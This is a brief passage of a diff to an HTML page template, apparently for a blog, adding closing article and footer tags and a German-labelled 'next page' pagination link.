+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
 
 <nav id="pagination">
   
+  
+    <a href="/page/2/" class="alignright next">Nächste Seite</a>
   
   <div class="clearfix"></div>
 </nav></div></div>
